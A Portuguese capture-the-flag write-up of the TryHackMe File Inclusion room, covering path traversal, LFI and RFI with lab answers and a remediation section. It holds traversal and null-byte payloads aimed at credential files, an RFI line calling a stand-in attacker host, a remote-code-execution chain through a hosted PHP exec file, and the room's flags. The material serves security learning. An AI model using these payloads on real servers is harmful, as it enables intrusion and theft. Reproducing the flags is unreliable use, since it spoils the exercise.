# Duckware Team - File Inclusion
###### Solved by @Antonio-alexandre

> This is a LFI, RFI and Path Traversal room in TryHackMe

## Desafio: File Inclusion - Tryhackme
#### Introdução

Essa sala aborda temas como Local File Inclusion (LFI), Remote File Inclusion (RFI) e Path Traversal. Tais vulnerabilidades ocorrem principalmente devido à falta de sanitização e validação adequada dos dados inseridos pelos usuários em parâmetros de URL. Quando uma aplicação web permite que um usuário controle quais arquivos o sistema deve acessar sem as devidas restrições, abre-se uma brecha crítica que pode ser explorada para comprometer a integridade do servidor.

#### Task 03 - Path Traversal

A vulnerabilidade de Directory Traversal (ou Path Traversal) permite que um atacante explore falhas na validação de entrada para acessar arquivos e diretórios localizados fora da raiz da aplicação web, manipulando parâmetros de URL. Através da técnica de "dot-dot-slash" (../), o invasor consegue subir níveis na árvore de diretórios do sistema operacional até atingir a raiz, possibilitando a leitura de arquivos sensíveis como o /etc/passwd no Linux ou o boot.ini no Windows. Essa exploração ocorre geralmente quando funções de leitura de arquivos (como file_get_contents no PHP) recebem dados do usuário sem o devido tratamento, expondo recursos críticos do servidor que deveriam estar protegidos.

Aqui está uma lista de arquivos críticos que são comumente explorados:

```
/etc/passwd : Contém a lista de todos os usuários registrados que possuem acesso ao sistema.

/etc/shadow : Armazena as senhas criptografadas (hashes) dos usuários do sistema.

/etc/issue : Exibe uma mensagem ou identificação do sistema antes do prompt de login.

/etc/profile : Controla variáveis padrão de todo o sistema, como exportação de variáveis, umask e tipos de terminal.

/proc/version : Especifica a versão detalhada do kernel Linux em execução.

/root/.bash_history : Armazena o histórico de comandos executados pelo usuário root.

/var/log/dmesg : Contém mensagens globais do sistema, incluindo logs gerados durante a inicialização.

/var/mail/root : Armazena todos os e-mails locais endereçados ao usuário root.

/root/.ssh/id_rsa : Chaves privadas SSH do root ou de outros usuários válidos no servidor.

/var/log/apache2/access.log : Registra todas as requisições acessadas no servidor web Apache.

C:\boot.ini : Contém as opções de inicialização para computadores com firmware BIOS (Windows).

C:\Windows\win.ini : Arquivo de configuração de sistema comumente usado para testar LFI em ambientes Windows.
```

* What function causes path traversal vulnerabilities in PHP?

Resp: file_get_contents

#### Task 04 - Local File Inclusion - LFI

As vulnerabilidades de Local File Inclusion (LFI) ocorrem principalmente devido à falta de conscientização em segurança por parte dos desenvolvedores ao utilizar funções de inclusão (como include e require no PHP) que aceitam entradas do usuário sem validação. Embora comum no PHP, essa falha também afeta aplicações em ASP, JSP e Node.js. O LFI segue conceitos idênticos ao path traversal, permitindo que um atacante manipule parâmetros de URL para forçar a aplicação a carregar e exibir arquivos sensíveis do servidor que não deveriam estar acessíveis publicamente.

Existem dois cenários comuns de exploração baseados na implementação do código: no primeiro, quando a função não especifica um diretório `(ex: include($_GET["lang"]))`, o atacante pode ler qualquer arquivo fornecendo o caminho direto, como /etc/passwd. No segundo cenário, quando o desenvolvedor prefixa um diretório no código `(ex: include("languages/" . $_GET['lang']))`, o atacante utiliza a técnica de "dot-dot-slash" (../../) para sair da pasta pré-definida e navegar até a raiz do sistema, alcançando os arquivos desejados da mesma forma.

* Give Lab #1 a try to read /etc/passwd. What would the request URI be?

Resp: lab1.php?file=/etc/passwd/

[![image.png](https://i.postimg.cc/52xVhQ0W/image.png)](https://postimg.cc/fJgpXLm8)

* In Lab #2, what is the directory specified in the include function?

Resp: includes

[![image.png](https://i.postimg.cc/RZPj2Pyg/image.png)](https://postimg.cc/RWHsHTMt)

#### Task 05 - Local File Inclusion - LFI Continued

Esta seção aprofunda-se em técnicas de Black Box Testing para explorar vulnerabilidades de LFI, onde as mensagens de erro do PHP tornam-se cruciais para revelar a estrutura interna do código (como caminhos absolutos e extensões forçadas). Três métodos principais de bypass são destacados: o uso do Null Byte (%00) para encerrar strings e ignorar extensões como .php (eficaz em versões do PHP anteriores à 5.3.4); o uso do ponto atual (/.) para contornar filtros de palavras-chave; e a técnica de aninhamento de sequências (....//), que funciona quando o filtro da aplicação remove apenas a primeira ocorrência de ../ sem realizar uma limpeza recursiva.

Além disso, o texto aborda cenários onde o desenvolvedor exige que o input comece com um diretório específico (ex: languages/). Nesses casos, a exploração é bem-sucedida ao incluir o diretório esperado no início do payload seguido pela sequência de traversal (ex: ?lang=languages/../../../../etc/passwd). Essas técnicas demonstram que filtros simples baseados em substituição de strings ou prefixos fixos são insuficientes para garantir a segurança se a lógica de tratamento de arquivos permanecer fundamentalmente insegura.

* Give Lab #3 a try to read /etc/passwd. What is the request look like?

Resp: 

Para essa questão, bastou utilizar ../../../../etc/passwd no payload, pois ele pede na descrição, juntamente com um nullbyte diretamente na url.

Dessa forma: `http://10.10.164.135/lab3.php?file=../../../../etc/passwd%00`

[![image.png](https://i.postimg.cc/wvJxq8YG/image.png)](https://postimg.cc/5Y4Wgr0B)

* Which function is causing the directory traversal in Lab #4?

Resp: file_get_contents

[![image.png](https://i.postimg.cc/BbqrddSz/image.png)](https://postimg.cc/mz5p9pF3)

* Try out Lab #6 and check what is the directory that has to be in the input field?

[![image.png](https://i.postimg.cc/sgST4Tzq/image.png)](https://postimg.cc/dhsRqmLj)

* Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?

Resp: 12.04

[![image.png](https://i.postimg.cc/WzFGb41s/image.png)](https://postimg.cc/xNQJ6nmZ)

#### Task 06 - Remote File Inclusion - RFI

A Remote File Inclusion (RFI) é uma vulnerabilidade que permite a inclusão de arquivos hospedados em servidores externos em uma aplicação vulnerável. Ela ocorre quando a entrada do usuário não é devidamente sanitizada, permitindo a injeção de uma URL externa em funções de inclusão (como o include do PHP). Para que o ataque seja bem-sucedido, é necessário que a configuração allow_url_fopen esteja ativada no servidor. O risco da RFI é consideravelmente maior que o da LFI, pois facilita a Execução Remota de Código (RCE), além de possibilitar vazamento de dados, XSS e ataques de negação de serviço (DoS).

O processo de ataque envolve o atacante hospedar um arquivo malicioso (por exemplo, um script PHP) em seu próprio servidor e passar essa URL como parâmetro para a aplicação alvo. O servidor da aplicação realiza uma requisição para buscar esse arquivo remoto e o executa localmente como se fizesse parte do seu próprio código. Por exemplo, ao injetar ?lang=http://atacante.com/shell.txt, o servidor vulnerável baixa o script e executa os comandos contidos nele, devolvendo o resultado da execução para o atacante.

#### Task 07 - Remediação

Como desenvolvedor, é fundamental estar ciente das vulnerabilidades em aplicações web, saber como encontrá-las e conhecer os métodos de prevenção. Para evitar vulnerabilidades de inclusão de arquivos, algumas sugestões comuns incluem:

* Mantenha o sistema e os serviços atualizados, incluindo frameworks de aplicações web, na versão mais recente.

* Desative os erros do PHP para evitar o vazamento do caminho da aplicação e outras informações potencialmente reveladoras.

* Um Web Application Firewall (WAF) é uma boa opção para ajudar a mitigar ataques a aplicações web.

* Desative recursos do PHP que causam vulnerabilidades de inclusão de arquivos caso sua aplicação não precise deles, como allow_url_fopen e allow_url_include.

* Analise cuidadosamente a aplicação web e permita apenas os protocolos e wrappers de PHP que sejam estritamente necessários.

* Nunca confie no input do usuário e certifique-se de implementar a validação de entrada adequada contra inclusão de arquivos.

* Implemente listas de permissão (whitelisting) para nomes e locais de arquivos, além de listas de bloqueio (blacklisting).

#### Task 08 - Challenge

* Capture Flag1 at /etc/flag1

Resp: F1x3d-iNpu7-f0rrn

Explicação: Para esse primeiro desafio, é necessário interceptar a requisição no BurpSuite, e alterar o método para POST. Após isso, basta utilizar um path traversal que é possível obter a flag:

[![image.png](https://i.postimg.cc/zGczJq3H/image.png)](https://postimg.cc/0z7RnRY9)

* Capture Flag2 at /etc/flag2

Resp: c00k13_i5_yuMmy1

Explicação: Para esse segundo desafio, a página permanece desabilitada até que o valor do cookie seja alterado. Porém, como ele valida apenas arquivos .php, é necessário adicionar um null-byte ao final do payload.

Ficando assim:

[![image.png](https://i.postimg.cc/ydKwKGhB/image.png)](https://postimg.cc/06ttdcHH)

* Capture Flag3 at /etc/flag3

Resp: P0st_1s_w0rk1in9

Explicação: Quando tentamos inserir um payload como `../../../../etc/flag3`, ele retorna que apenas aceita plain string. Porém, se alterar o método para POST no BurpSuite, ele ignora esse filtro. Basta então adicionar o null-byte para ignorar o filtro de .php, que ele executa e retorna a flag:

[![image.png](https://i.postimg.cc/wvBQDcgQ/image.png)](https://postimg.cc/7CpzkzC5)

Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

Resp:

Explicação: Para essa questão, é necessário criar um servidor python com o seguinte comando:

`python -m http.server 8000`

No mesmo diretório que o servidor está rodando, basta criar um arquivo `host.txt`, com o seguinte código:

```
<?php
print exec('hostname');
?>
```

Após isso, basta acessar a seguinte URL:

`http://IP/playground.php?file=http://IP:8000/host.txt`

Fazendo isso, ele retorna a seguinte flag:

`lfi-vm-thm-f8c5b1a78692`


